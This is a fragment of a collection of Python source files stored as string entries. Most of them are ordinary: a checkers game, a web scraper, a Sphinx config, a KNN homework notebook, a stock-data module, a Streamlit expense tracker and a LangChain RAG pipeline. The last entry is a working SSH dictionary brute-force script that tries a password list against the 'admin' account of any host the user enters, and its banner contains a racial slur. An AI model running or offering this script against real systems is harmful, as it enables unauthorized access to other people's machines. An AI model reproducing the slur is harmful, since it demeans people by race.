valid_moves:\n                                board.move_piece(selected_piece, (row, col))\n                                board.unhighlight_squares()\n                                return\n                            else:\n                                board.unhighlight_squares()\n                                selected_piece = None\n                                valid_moves = []\n\n    def __init__(self, color):\n        self.color = color\n\nclass Piece:\n    def __init__(self, color, position):\n        self.color = color\n        self.position = position\n        self.is_king = False\n\n    def make_king(self):\n        self.is_king = True\n\nclass Board:\n    def __init__(self):\n        self.board = []\n        self.selected_piece = None\n        self.turn = \"red\"\n        self.initialize_board()\n\n    def initialize_board(self):\n        for row in range(8):\n            self.board.append([])\n            for col in range(8):\n                if row < 3 and (row + col) % 2 == 1:\n                    self.board[row].append(Piece(\"black\", (row, col)))\n                elif row > 4 and (row + col) % 2 == 1:\n                    self.board[row].append(Piece(\"red\", (row, col)))\n                else:\n                    self.board[row].append(None)\n\n    def get_piece(self, row, col):\n        return self.board[row][col]\n\n    def get_valid_moves(self, piece):\n        valid_moves = []\n        row, col = piece.position\n        color = piece.color\n\n        # Regular moves\n        if color == \"red\":\n            # Red pieces move upwards\n            if row > 0:\n                if col > 0 and self.board[row - 1][col - 1] is None:\n                    valid_moves.append((row - 1, col - 1))\n                if col < 7 and self.board[row - 1][col + 1] is None:\n                    valid_moves.append((row - 1, col + 1))\n        else:\n            # Black pieces move downwards\n            if row < 7:\n                if col > 0 and self.board[row + 1][col - 1] is None:\n                    valid_moves.append((row + 1, col - 1))\n                if col < 7 and self.board[row + 1][col + 1] is None:\n                    valid_moves.append((row + 1, col + 1))\n\n        # Capturing moves\n        self.get_capturing_moves(piece, row, col, valid_moves)\n\n        # TODO: Handle king pieces\n        # if piece.is_king:\n        #     # Add valid moves for king pieces (moving backwards)\n        #     pass\n\n        return valid_moves\n    \n    def get_capturing_moves(self, piece, row, col, valid_moves):\n        color = piece.color\n        opponent_color = \"black\" if color == \"red\" else \"red\"\n\n        # Check capturing moves in all four directions\n        directions = [(-1, -1), (-1, 1), (1, -1), (1, 1)]\n        for dr, dc in directions:\n            if 0 <= row + 2 * dr < 8 and 0 <= col + 2 * dc < 8:\n                if (\n                    self.board[row + dr][col + dc] is not None\n                    and self.board[row + dr][col + dc].color == opponent_color\n                    and self.board[row + 2 * dr][col + 2 * dc] is None\n                ):\n                    valid_moves.append((row + 2 * dr, col + 2 * dc))\n                    self.get_capturing_moves(piece, row + 2 * dr, col + 2 * dc, valid_moves)\n\n    def highlight_square(self, position, color):\n        row, col = position\n        pygame.draw.rect(screen, color, (col * 100, row * 100, 100, 100), 4)\n        pygame.display.update()\n\n    def unhighlight_squares(self):\n        self.selected_piece = None\n        self.render()\n\n    def highlight_valid_moves(self, valid_moves):\n        for move in valid_moves:\n           ",
    "import os\nimport requests\nfrom bs4 import BeautifulSoup\n\ndef parse_website(url):\n    headers = {\n        'User-Agent': 'Your User Agent String Here',\n    }\n    response = requests.get(url, headers=headers)\n\n    if response.status_code == 200:\n        return response.content\n    else:\n        print(\"Failed to retrieve webpage:\", response.status_code)\n        return None\n\ndef scrape_and_save_problem_statement(links_file, output_folder):\n    # Create the output folder if it doesn't exist\n    if not os.path.exists(output_folder):\n        os.makedirs(output_folder)\n\n    with open(links_file, 'r') as file:\n        for idx, link in enumerate(file, start=4675):\n            link = link.strip()  # Remove leading/trailing whitespace and newline characters\n            print(f\"Scraping problem statement from link {idx}: {link}\")\n            html_content = parse_website(link)\n            if html_content:\n                try:\n                    soup = BeautifulSoup(html_content, 'html.parser')\n                    # Find all elements with class 'problem-statement' and extract text\n                    problem_statement = soup.find(class_='problem-statement').get_text()\n                    # Generate a filename for the text file\n                    filename = os.path.join(output_folder, f'problem_statement_{idx}.txt')\n                    # Save the problem statement text to a file\n                    with open(filename, 'w', encoding='utf-8') as text_file:\n                        text_file.write(problem_statement)\n                    print(f\"Problem statement saved to: {filename}\")\n                except (AttributeError, UnicodeEncodeError):\n                    # Handle cases where the problem statement cannot be found or encoding error occurs\n                    print(f\"Unable to save problem statement for link {idx}\")\n                    filename = os.path.join(output_folder, f'problem_statement_{idx}.txt')\n                    with open(filename, 'w', encoding='utf-8') as text_file:\n                        text_file.write(\"\")  # Write an empty file\n\n# Define paths and filenames\nlinks_file = 'problem_links_2.txt'  # File containing the list of links\noutput_folder = 'qdata'  # Folder to save problem statement files\n\n# Scrape problem statement text from links and save to separate files\nscrape_and_save_problem_statement(links_file, output_folder)\n",
    "\"\"\"\nConfiguration file for the Sphinx documentation builder.\n\nThis file only contains a selection of the most common options.\nFor a full list see the documentation:\nhttps://www.sphinx-doc.org/en/master/usage/configuration.html\n\"\"\"\n\nimport datetime as dt\nimport importlib.metadata as im\nimport pathlib as plib\n\n\ndef load_nitpick_ignore() -> list:\n    # Load references to be ignored by `nitpick`.\n    sphinx_src_dir = plib.Path(__file__).parent\n    f_path = sphinx_src_dir / \"nitpick-exceptions\"\n\n    data = set()\n    for line in open(f_path, mode=\"r\"):\n        if line.strip() == \"\" or line.startswith(\"#\"):\n            continue\n        dtype, target = line.split(None, 1)\n        data.add((dtype, target.strip()))\n    return list(data)\n\n\n# -- Project information -----------------------------------------------------\ncfg = im.metadata(\"pyxu_xrt\")\nauthor = cfg[\"Author-email\"]  # \"Author\" alone doesn't work if email provided in pyproject.toml; don't know why\ncopyright = f\"{dt.date.today().year}, {author}\"\n\n# Compute legible version info.\nversion = cfg[\"Version\"]  # <semver>[.devXXX][+<git-hash>]\nversion = version.strip().split(\"+\")[0]  # restrict to <semver>[.devXXX]\nrelease = version\n\n# -- General configuration ---------------------------------------------------\nroot_doc = \"index\"  # legacy term = \"master_doc\"\ndefault_role = \"code\"  # None\npygments_style = \"sphinx\"  # The name of the Pygments (syntax highlighting) style to use.\n\n# List of patterns, relative to source directory, that match files and directories to ignore when looking for source\n# files.  This pattern also affects html_static_path and html_extra_path.\nexclude_patterns = [\n    \"_build\",\n    \"Thumbs.db\",\n    \".DS_Store\",\n    \"**.ipynb_checkpoints\",\n]\n\n# Add any paths that contain templates here, relative to this directory.\ntemplates_path = [\"_templates\"]\n\nnitpicky = True\nnitpick_ignore_regex = load_nitpick_ignore()\nadd_module_names = False\nmaximum_signature_line_length = 140\nlanguage = \"en\"\n\n# -- Options for Python domain -----------------------------------------------\npython_display_short_literal_types = True\n\n# -- Options for HTML output -------------------------------------------------\nhtml_theme = \"pydata_sphinx_theme\"\nhtml_title = \"pyxu_xrt Documentation\"\nhtml_logo = \"_static/logo.png\"\nhtml_favicon = \"_static/favicon.png\"\nhtml_sourcelink_suffix = \"\"\nhtml_short_title = \"Pyxu X-Ray Transform Operators\"\n\nhtml_theme_options = {\n    \"header_links_before_dropdown\": 6,\n    \"icon_links\": [\n        {\n            \"name\": \"GitHub\",\n            \"url\": \"https://github.com/pyxu-org/pyxu_xrt/\",\n            \"icon\": \"fa-brands fa-github\",\n        },\n        {\n            \"name\": \"PyPI\",\n            \"url\": \"https://pypi.org/project/pyxu_xrt/\",\n            \"icon\": \"fa-brands fa-python\",\n        },\n        {\n            \"name\": \"Contact\",\n            \"url\": \"mailto: sepand@kashani.ch\",\n        },\n    ],\n    \"use_edit_page_button\": True,\n    \"show_toc_level\": 2,\n    \"navbar_align\": \"content\",  # [left, content, right] For testing that the navbar items align properly\n    \"navbar_center\": [\"navbar-nav\"],\n    \"navbar_start\": [\"navbar-logo\"],\n    \"navbar_end\": [\"navbar-version\", \"navbar-icon-links\"],\n    \"secondary_sidebar_items\": [\"page-toc\", \"searchbox\", \"edit-this-page\", \"sourcelink\"],\n    \"footer_start\": [\"copyright\", \"sphinx-version\", \"theme-version\"],\n    \"pygment_light_style\": \"tango\",\n}\n\nhtml_context = {\n    \"github_user\": \"SepandKashani\",\n    \"github_repo\": \"https://github.com/pyxu-org/pyxu_xrt\",\n    \"github_version\": \"main\",\n    \"doc_path\": \"doc\",\n    \"default_mode\": \"light\",\n}\n\n# Add any paths that contain custom static files (such as style sheets) here, relative to this directory. They are\n# copied after the builtin static files, so a file named \"default.css\" will overwrite the builtin \"default.css\".\nhtml_static_path = [\"_static\"]\nhtml_css_files = [\"css/custom.css\"]\n\n## EXTENSION CONFIGURATION ===================================================\nextensions = [\n    \"matplotlib.sphinxext.plot_directive\",\n    \"nbsphinx\",\n    \"sphinx_codeautolink\",\n    \"sphinx_copybutton\",\n    \"sphinx_design\",\n    \"sphinx_gallery.gen_gallery\",\n    \"sphinx_togglebutton\",\n    \"sphinx.ext.autodoc\",\n    \"sphinx.ext.autosummary\",\n    \"sphinx.ext.intersphinx\",\n    \"sphinx.ext.mathjax\",\n    \"sphinx.ext.napoleon\",\n    \"sphinx.ext.todo\",\n    \"sphinx.ext.viewcode\",\n]\n\n# -- Options for plot_directive extension ------------------------------------\nplot_include_source = True\nplot_html_show_source_link = True\n# plot_formats = [(\"png\", 90)]\n\n# -- Options for nbsphinx extension ------------------------------------------\n# If the notebooks take a long time to run, pre-run them and save the outputs. The following line tells nbsphinx not to\n# re-run them during the build process.\nnbsphinx_execute = \"never\"\n\n# -- Options for codeautolink extension --------------------------------------\ncodeautolink_autodoc_inject = False\ncodeautolink_search_css_classes = [\"highlight-default\"]\ncodeautolink_concat_default =",
    "# -*- coding: utf-8 -*-\n\"\"\"assignment.ipynb\n\nAutomatically generated by Colaboratory.\n\nOriginal file is located at\n    https://colab.research.google.com/drive/1pFpPN2ISL4EeHk8k2d_CqNMxIOADjsA7\n\"\"\"\n# Name-Nipun Bharadwaj\n# Roll Number-22AG30027\nimport numpy as np\nimport pandas as pd\nimport matplotlib.pyplot as plt\nimport seaborn as sns\n\n# Function for z score normalisation\ndef z_score_norm(df):\n\n  # Calculate the mean and standard deviation of each column.\n  mu = df.mean()\n  sigma = df.std()\n\n  # Normalize each column.\n  for column in df.columns:\n    df[column] = (df[column] - mu[column]) / sigma[column]\n\n  return df\n\ndf=pd.read_csv(\"Iris.csv\")\ndf\n\ndf2 = z_score_norm(df.drop(columns=['Species', 'Id']))\ndf2\n\nX = df2\nX = X.values.astype(float)\nX\n\nspecies_map = {\"Iris-setosa\": 1.0, \"Iris-versicolor\": 2.0, \"Iris-virginica\": 3.0}\ny = df[\"Species\"].map(species_map)\ny = y.values.astype(float)\n# y1=z_score_norm(y)\ny\n\n# Data set splitting\ndf = df.sample(frac=1)\n\n# Select the ratio to split the data frame into test and train sets\ntest_size = 0.3\n\n# Split data frames into training and testing data frames using slicing\nX_train = X[:int(len(df2) * (1 - test_size))]\nX_test = X[int(len(df2) * (1 - test_size)):]\ny_train = y[:int(len(df) * (1 - test_size))]\ny_test = y[int(len(df) * (1 - test_size)):]\n# Print the shape of the training and testing data frames\nprint(\"Shape of the training data frame:\", X_train.shape)\nprint(\"Shape of the testing data frame:\", X_test.shape)\n\nX_train\n\nX_test\n\ny_train\n\ny_test\n\ndef accuracy_metric(actual, predicted):\n    correct = 0\n    for i in range(len(actual)):\n        if actual[i] == predicted[i]:\n            correct += 1\n    return correct / float(len(actual)) * 100.0\n\n#KNN Normal\nclass knn_normal:\n    def __init__(self, k):\n        self.k = k\n        self.point = None\n\n    def fit(self, X_train, y_train):\n        self.X_train = X_train\n        self.y_train = y_train\n\n    def euclidean_distance(self, x1, x2):\n        return np.sqrt(np.sum((x1 - x2) ** 2))\n\n    def predict(self, X_test):\n        predictions = [self._predict(X) for X in X_test]\n        return np.array(predictions)\n\n    def _predict(self, X):\n        # Calculate distances between X and all examples in the training set\n        distances = [self.euclidean_distance(X, X_train) for X_train in self.X_train]\n\n        # Get indices of k-nearest training data points\n        k_neighbors_indices = np.argsort(distances)[:self.k]\n\n        # Get the labels of the k-nearest training data points\n        k_neighbor_labels = [self.y_train[i] for i in k_neighbors_indices]\n\n        # Return the most common class label among the k neighbors\n        most_common = np.bincount(k_neighbor_labels).argmax()\n        return most_common\n\n# Knn Weighted\nclass knn_weigh:\n    def __init__(self, k):\n        self.k = k\n\n    def fit(self, X_train, y_train):\n        self.X_train = X_train\n        self.y_train = y_train\n\n    def euclidean_distance(self, x1, x2):\n        return np.sqrt(np.sum((x1 - x2) ** 2))\n\n    def predict(self, X_test):\n        predictions = [self._predict(x) for x in X_test]\n        return np.array(predictions)\n\n    def _predict(self, x):\n        # Calculate distances between x and all examples in the training set\n        distances = [self.euclidean_distance(x, x_train) for x_train in self.X_train]\n\n        # Get indices of k-nearest training data points\n        k_neighbors_indices = np.argsort(distances)[:self.k]\n\n        # Get the labels and distances of the k-nearest training data points\n        k_neighbor_labels = [self.y_train[i] for i in k_neighbors_indices]\n        k_neighbor_distances = [distances[i] for i in k_neighbors_indices]\n\n        # Calculate weights based on distances\n        weights = 1 / (np.array(k_neighbor_distances) + 1e-6)  # Adding a small value to avoid division by zero\n\n        # Weighted sum of class labels\n        weighted_sum = np.sum(weights * k_neighbor_labels)\n\n        # Normalize the weighted sum\n        prediction = weighted_sum / np.sum(weights)\n\n        return int(round(prediction))\n\nmodel=knn_normal(k=3)\nmodel.fit(X_train,y_train)\npredictions = model.predict(X_test)\npredictions\n\n# Iterating for best k normal\nk_values = [1, 3, 5, 10, 20]\naccuracy_values = []\n\n\nfor k in k_values:\n\n    knn = knn_normal(k=k)\n    knn.fit(X_train, y_train)\n\n\n    y_pred = knn.predict(X_test)\n\n\n    accuracy = accuracy_metric(y_test, y_pred)\n    accuracy_values.append(accuracy)\n\nprint(accuracy_values)\nbest_k=k_values[np.argmax(accuracy_values)]\nprint(best_k)\n\nplt.figure(figsize=(10, 6))\nplt.plot(k_values, accuracy_values, marker='o', linestyle='-', color='b')\nplt.title('Accuracy vs. Number of Neighbors (k) for KNN on Iris Dataset')\nplt.xlabel('Number of Neighbors (k)')\nplt.ylabel('Accuracy')\nplt.xticks(k_values)\nplt.grid(True)\nplt.show()\n\nfrom sklearn.metrics import confusion_matrix\nbest_knn_normal = knn_normal(k=best_k)\nbest_knn_normal.fit(X_train, y_train)\n\n# Make predictions on the test data using the best K\ny_pred_best = best_knn_",
    "# -*- coding: utf-8 -*-\n\"\"\"\nQuick Fin\n\nA Python module providing instant access to live\nand historical stock market price data, automated\nPlotly data visualization generators and a metadata\ncatalog for referencing equities, stock symbols, sectors,\nand industry information.\n\"\"\"\n\n__version__ = \"1.13.0\"\n__author__ = \"Derek Evans <https://github.com/REPNOT>\"\n__date__ = \"28 March 2024\"\n\nimport json\nfrom pprint import pprint\nimport requests\nimport datetime\nfrom datetime import datetime\nfrom urllib.request import Request, urlopen\nimport plotly.graph_objects as go\n\n\nclass FinInfo():\n\n    \"\"\"\n    A class for accessing a metadata catalog for referencing. \n    equities, stock symbols, sectors, and industry information.\n\n    THE FOLLOWING APPLIES TO ALL FinInfo METHOD:\n\n    If the value is set to `False`\n    for the `payload` parameter, this method\n    will `pretty print` the requested data omitting\n    a return value.  Otherwise, the value assigned to the\n    `payload` parameter is set to `True` by default, and\n    the method will return a data payload.\n    \"\"\"\n\n\n    def __init__(self):\n\n        \"\"\"\n        Initialize the FinInfo class and retreive metadata catalog.\n        \"\"\"\n\n        self.url = \"https://gist.githubusercontent.com/REPNOT/6bffda0dd727d63a0bd727d4ff1c890a/raw/5228da45d64741489973b8e05a0abf3d2a3957c1/fin_data.json\"\n        self.data = requests.get(self.url).json()\n\n\n    def equity(self, symbol, payload=True):\n\n        \"\"\"\n        Return object containing the symbol, company name,\n        sector, and industry for the stock symbol passed to\n        the `symbol` parameter.\n        \"\"\"\n\n        self.symbol = symbol\n\n        if payload == True:\n\n            return self.data[\"equities\"][self.symbol]\n\n        else:\n\n            pprint(self.data[\"equities\"][self.symbol])\n\n\n    def equities(self, payload=True):\n\n        \"\"\"\n        Return data payload containing the symbol, company name,\n        sector, and industry for all equities included in the\n        metadata catalog.\n\n        PAYLOAD CONTENTS:\n\n        An array of objects.\n        \"\"\"\n\n        self.payload = []\n\n        for symbol in self.data[\"equities\"].keys():\n\n            self.payload.append(self.data[\"equities\"][symbol])\n\n        if payload == True:\n\n            return self.payload\n\n        else:\n\n            pprint(self.payload)\n\n\n    def industries(self, payload=True):\n\n        \"\"\"\n        Return data payload containing a list\n        of all industries available in the metadata\n        catalog.\n\n        PAYLOAD CONTENTS:\n\n        An array of strings.\n        \"\"\"\n\n        if payload == True:\n\n            return self.data[\"meta_data\"][\"industries\"]\n\n        else:\n\n            pprint(self.data[\"meta_data\"][\"industries\"])\n\n\n    def sectors(self, payload=True):\n\n        \"\"\"\n        Return data payload containing a list\n        of all sectors available in the metadata\n        catalog.\n\n        PAYLOAD CONTENTS:\n\n        An array of strings.\n        \"\"\"\n\n        if payload == True:\n\n            return self.data[\"meta_data\"][\"sectors\"]\n\n        else:\n\n            pprint(self.data[\"meta_data\"][\"sectors\"])\n\n\n    def sector_industries(self, sector=None, payload=True):\n\n        \"\"\"\n        Return data payload containing a list\n        of all industries belonging to the sector\n        passed to the `sector` parameter. \n\n        PAYLOAD CONTENTS:\n\n        An array of strings.\n\n        By default, the return value will include an \n        object containing all sectors and associated industries.\n        \"\"\"\n\n        try:\n            self.sector = sector.title()\n        except:\n            return '===  ERROR: DATA TYPE - SECTOR MUST BE STRING  ==='\n\n        try:\n            if payload == True and self.sector != None:\n                return self.data[\"meta_data\"][\"sector-industries\"][self.sector]\n            elif payload != True and self.sector != None:\n                pprint(self.data[\"meta_data\"][\"sector-industries\"][self.sector])\n            elif payload != True and self.sector == None:\n                pprint(self.data[\"meta_data\"][\"sector-industries\"])\n            else:\n                return self.data[\"meta_data\"][\"sector-industries\"]\n        except:\n            return '===  ERROR: INVALID SECTOR ENTRY  ==='\n\n\n    def sector_equities(self, sector=None, payload=True):\n\n        \"\"\"\n        Return data payload containing a list\n        of all equities belonging to the sector\n        passed to the `sector` parameter. \n\n        PAYLOAD CONTENTS:\n\n        An array of objects.\n\n        By default, the return value will include an \n        object containing all sectors and associated \n        equity data.\n        \"\"\"\n\n        try:\n            self.sector = sector.title()\n        except:\n            return '===  ERROR: DATA TYPE - SECTOR MUST BE STRING  ==='\n\n        try:\n            if payload == True and self.sector != None:\n                return self.data[\"sectors\"][self.sector]\n            elif payload != True and self.sector != None:\n                pprint(self.d",
    "import calendar\r\nfrom datetime import datetime\r\n\r\n\r\nfrom pymongo import MongoClient\r\nimport streamlit as st\r\nfrom streamlit_option_menu import option_menu  # pip install streamlit-option-menu\r\nimport plotly.graph_objects as go\r\n\r\n# Load the environment variables\r\nMONGODB_CONNECTION_STRING = \"mongodb://localhost:27017/\"\r\n\r\n# Connect to MongoDB\r\nclient = MongoClient(MONGODB_CONNECTION_STRING)\r\ndb = client[\"monthly_reports\"]\r\n\r\n# Check if the database exists and create it if it doesn't\r\nif \"periods\" not in db.list_collection_names():\r\n    db.create_collection(\"periods\")\r\n\r\ndef insert_period(period, incomes, expenses, comment):\r\n    \"\"\"Returns the report on a successful creation, otherwise raises an error\"\"\"\r\n    collection = db[\"periods\"]\r\n    return collection.insert_one({\"key\": period, \"inc\": incomes, \"expenses\": expenses, \"comment\": comment})\r\n\r\ndef fetch_all_periods():\r\n    \"\"\"Returns a dict of all periods\"\"\"\r\n    collection = db[\"periods\"]\r\n    periods = collection.find()\r\n    return list(periods)\r\n\r\ndef get_period(period):\r\n    \"\"\"If not found, the function will return None\"\"\"\r\n    collection = db[\"periods\"]\r\n    return collection.find_one({\"key\": period})\r\n\r\n# --------------SETTINGS -----------\r\nincome = [\"Salary\", \"Blog\", \"Other Income\"]\r\nexpenses = [\"Rent\", \"Utilities\", \"Groceries\", \"Cars\", \"Other Expenses\", \"Savings\"]\r\ncurrency = \"USD\"\r\npage_title = \"Income and Expense Tracker\"\r\npage_icon = \":money_with_wings:\"\r\nlayout = \"centered\"\r\n# ----------------------------------------\r\n\r\nst.set_page_config(page_title=page_title, page_icon=page_icon, layout=layout)\r\nst.title(page_title + \" \" + page_icon)\r\n\r\n# --- DROP DOWN VALUES FOR SELECTING THE PERIOD ----\r\nyears = [datetime.today().year, datetime.today().year + 1]\r\nmonths = list(calendar.month_name[1:])\r\n\r\n# --- HIDE STREAMLIT STYLE ---\r\nhide_st_style = \"\"\"\r\n            <style>\r\n            #MainMenu {visibility: hidden;}\r\n            footer {visibility: hidden;}\r\n            header {visibility: hidden;}\r\n            </style>\r\n            \"\"\"\r\nst.markdown(hide_st_style, unsafe_allow_html=True)\r\n\r\n\r\n# --- NAVIGATION MENU ---\r\nselected = option_menu(\r\n    menu_title=None,\r\n    options=[\"Data Entry\", \"Data Visualization\"],\r\n    icons=[\"pencil-fill\", \"bar-chart-fill\"],  # https://icons.getbootstrap.com/\r\n    orientation=\"horizontal\",\r\n)\r\n\r\n# ---INPUT & SAVE PERIODS ---\r\nif selected == \"Data Entry\":\r\n    st.header(f\"Data Entry in {currency}\")\r\n    with st.form(\"entry_form\", clear_on_submit=True):\r\n        col1,col2 = st.columns(2)\r\n        col1.selectbox(\"Select Month:\", months, key=\"month\")\r\n        col2.selectbox(\"Select Year:\", years, key=\"year\")\r\n\r\n        \"---\"\r\n        with st.expander(\"Income\"):\r\n            for inc in income:\r\n                st.number_input(f\"{inc}:\", min_value=0, format=\"%i\", step=10, key=inc)\r\n        with st.expander(\"Expenses\"):\r\n            for expense in expenses:\r\n                st.number_input(f\"{expense}:\", min_value=0, format=\"%i\", step=10, key=expense)\r\n        with st.expander(\"Comment\"):\r\n            comment = st.text_area(\"\", placeholder=\"Enter a comment here...\", key=\"comment\")  # Initialize comment\r\n            \"---\"\r\n            submitted = st.form_submit_button(\"Save Data\")\r\n            if submitted:\r\n                period = f\"{st.session_state['year']}_{st.session_state['month']}\"\r\n                incomes = {inc: st.session_state[inc] for inc in income}\r\n                expenses = {expense: st.session_state[expense] for expense in expenses}\r\n                comment_value = st.session_state['comment']\r\n                # Insert values into database\r\n                result = insert_period(period, incomes, expenses, comment_value)\r\n                if result.acknowledged:\r\n                    st.success(\"Data saved successfully!\")\r\n                else:\r\n                    st.error(\"Failed to save data.\")\r\n\r\n\r\nif selected == \"Data Visualization\":\r\n    st.header(\"Data Visualization\")\r\n    with st.form(\"saved_periods\"):\r\n        saved_periods = fetch_all_periods()\r\n        saved_period_names = [period[\"key\"] for period in saved_periods]\r\n        period = st.selectbox(\"Select Period:\", saved_period_names)\r\n        submitted = st.form_submit_button(\"Plot Period\")\r\n        if submitted:\r\n            selected_period = next((p for p in saved_periods if p[\"key\"] == period), None)\r\n            if selected_period:\r\n                incomes = selected_period[\"inc\"]\r\n                expenses = selected_period[\"expenses\"]\r\n                comment = selected_period[\"comment\"]\r\n                # Calculate total income and expenses\r\n                total_income = sum(incomes.values())\r\n                total_expense = sum(expenses.values())\r\n                remaining_budget = total_income - total_expense\r\n                \r\n                # Display metrics\r\n                col1, col2, col3 = st.columns(3)\r\n                col1.metric(\"Total Income\", f\"{total_income}{currency}\")\r\n                col2.metric(\"Total Expense\", f\"{total_expen",
    "# Import the necessary modules and functions\nimport os\nfrom dotenv import load_dotenv\nimport code\nfrom unstructured.partition.pdf import partition_pdf\nfrom pydantic import BaseModel\nfrom typing import Any\n\nfrom langchain_openai import ChatOpenAI, OpenAIEmbeddings\nfrom langchain.retrievers import MultiVectorRetriever\nfrom langchain.storage import InMemoryStore\nfrom langchain_community.vectorstores.elasticsearch import ElasticsearchStore\n\nfrom elasticsearch import Elasticsearch\n\nfrom langchain_core.prompts import ChatPromptTemplate\nfrom langchain_core.output_parsers import StrOutputParser\nfrom langchain_core.runnables import (\n  RunnableLambda,\n  RunnablePassthrough\n)\nfrom langchain_core.documents import Document\nfrom langchain.output_parsers import JsonOutputToolsParser\n\nimport uuid\nfrom typing import Union\nfrom operator import itemgetter\nimport pickle\nfrom itertools import chain\nfrom langchain_core.pydantic_v1 import SecretStr\n\n# Load the .env file. By default, it looks for the .env file in the same directory as the script being run, or you can specify the path as an argument.\nload_dotenv()\n\nOPENAI_API_KEY=os.getenv(\"OPENAI_API_KEY\", \"\")\nAPI_KEY_UNSTRUCTURED = os.getenv(\"API_KEY_UNSTRUCTURED\", \"\")\nAPI_BASE_URL_UNSTRUCTURED = os.getenv(\"API_BASE_URL_UNSTRUCTURED\", \"\")\nES_HOST = os.getenv(\"ES_HOST\", \"\")\nES_PORT = int(os.getenv(\"ES_PORT\", \"9200\"))\nES_INDEX = os.getenv(\"ES_INDEX\", \"\")\n\nmodel = ChatOpenAI(temperature=0, model=\"gpt-3.5-turbo-1106\", api_key=SecretStr(OPENAI_API_KEY) )\nVectorStoreSingleton = None\nESSingleton = None\n\nclass Element(BaseModel):\n  type: str\n  text: Any\n\n# TODO: These should really be loaded on the fly from the filesystem\n# Define list containing pdf paths and pdf names to be used throughout later on\npdf_paths = [\n            # \"./docs/amazon/amazon-2019.pdf\",\n            #  \"./docs/amazon/amazon-2020.pdf\",\n            #  \"./docs/amazon/amazon-2021.pdf\",\n            #  \"./docs/amazon/amazon-2022.pdf\",\n            #  \"./docs/amazon/amazon-2023.pdf\", \n             \"./docs/amazon/amazon-2024.pdf\",\n            #  \"./docs/alphabet/20210203-alphabet-10k\",\n            #  \"./docs/alphabet/20220202-alphabet-10k\",\n             \"./docs/alphabet/goog-10-k-2023.pdf\",\n            #  \"./docs/alphabet/goog-10-k-q4-2022.pdf\"\n]\npdfs = [\n        # \"amazon-2019.pdf\",\n        # \"amazon-2020.pdf\", \n        # \"amazon-2021.pdf\", \n        # \"amazon-2023.pdf\", \n        \"amazon-2024.pdf\",\n        # \"20210203-alphabet-10k\",\n        # \"20220202-alphabet-10k\",\n        \"goog-10-k-2023.pdf\",\n        # \"goog-10-k-q4-2022.pdf\"\n        ]\n\n#################### ES / Vector Store Funcs ####################\ndef getVectorStore():\n  global VectorStoreSingleton\n  if VectorStoreSingleton is None:\n    print(\"Setting up vector store\")\n    VectorStoreSingleton = ElasticsearchStore(\n        # https://python.langchain.com/docs/integrations/vectorstores/elasticsearch\n        embedding=OpenAIEmbeddings(model=\"text-embedding-3-small\", api_key=SecretStr(OPENAI_API_KEY)),\n        es_url=\"http://\"+ES_HOST+\":\"+str(ES_PORT),\n        index_name=ES_INDEX,\n        strategy=ElasticsearchStore.ApproxRetrievalStrategy()\n    )\n  else:\n    print(\"Vector store already set up\")\n\n  return VectorStoreSingleton\n\ndef get_es():\n  global ESSingleton\n  if ESSingleton is None:\n    print(\"Setting up ES\")\n    ESSingleton = Elasticsearch([{'host': ES_HOST, 'port': ES_PORT, 'scheme': 'http'}])\n  else:\n    print(\"ES already set up\")\n\n  return ESSingleton\n\n#################### Data Loading & Processing Funcs ####################\ndef processPDFsToPickles():\n  raw_pdfs_elements = []\n\n  # Get parsed elements for each PDF\n  for i,pdf_path in enumerate(pdf_paths):\n    print(f\"processing: {pdf_path}\")\n    raw_pdfs_elements.append(\n      partition_pdf(\n        # https://unstructured-io.github.io/unstructured/apis/api_parameters.html\n        filename=pdf_path,\n        extract_images_in_pdf=False,\n        infer_table_structure=True,\n        chunking_strategy=\"by_title\",\n        max_characters=1800,\n        new_after_n_chars=1500,\n        combine_text_under_n_chars=1000,\n        image_output_dir_path=\"./\",\n        url=API_BASE_URL_UNSTRUCTURED,\n        token=API_KEY_UNSTRUCTURED,\n        verbose=True\n      )\n    )\n\n    # store the parsed elements as pickles to reuse them whenever necessary\n    with open(f'{pdf_path}-{i}.pkl', 'wb') as f:\n      print(f\"saving: {pdf_path}-{i}\")\n      pickle.dump(raw_pdfs_elements[i], f)\n\n  return raw_pdfs_elements\n\ndef loadDataFromPickles(pickle_paths):\n  # Load from pickle\n  raw_pdf_elements = []\n  for pdf in pickle_paths:\n    with open(f\"{pdf}\", 'rb') as f:\n      raw_pdf_elements.append(pickle.load(f))\n      \n  return raw_pdf_elements\n\ndef processTablesAndText(raw_pdfs_elements):\n  # Categorize by type\n  print(\"Categorizing elements\")\n  categorized_elements = [\n      [\n          Element(type=\"table\", text=str(element.metadata.text_as_html))\n          if \"unstructured.documents.elements.Table\" in str(type(element))\n          else Element(type",
    "import paramiko\nimport sys\nimport time\n\ndef sshConnection(target, password):\n    ssh = paramiko.SSHClient()\n    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n    try:\n        ssh.connect(target, port=22, username=\"admin\", password=password, timeout=1)\n        print(f\"\\nAuthentication successful. Credentials: admin@{target} Password: {password}\")\n        sys.exit(0)\n    except:\n        pass\n    finally:\n        ssh.close()\n\ndef main(target, password_file):\n    try:\n        with open(password_file, \"r\") as f:\n            passwords = f.readlines()\n    except FileNotFoundError:\n        print(f\"File {password_file} not found.\")\n        sys.exit(1)\n\n    print(\"\\n\\tBrute forcing r00ters by yall skid niggas can't even booterscan right love poole and some nigga on meth from the file...\\n\")\n    for password in passwords:\n        start_time = time.time()\n        password = password.strip()\n        sshConnection(target, password)\n        while time.time() - start_time < 0.001:  # Attempt to enforce a 1ms delay\n            pass  # Busy-wait to more closely align with the desired timing\n\nif __name__ == \"__main__\":\n    print(\"\\n\\tDictionary brute force attack on SSH services\")\n    print(\"\\t---------------------------------------------\\n\\n\")\n\n    target = input(\" > Enter target host address to connect to: \")\n    password_file = input(\" > Enter the filename of the password list: \")\n\n    main(target, password_file)\n",
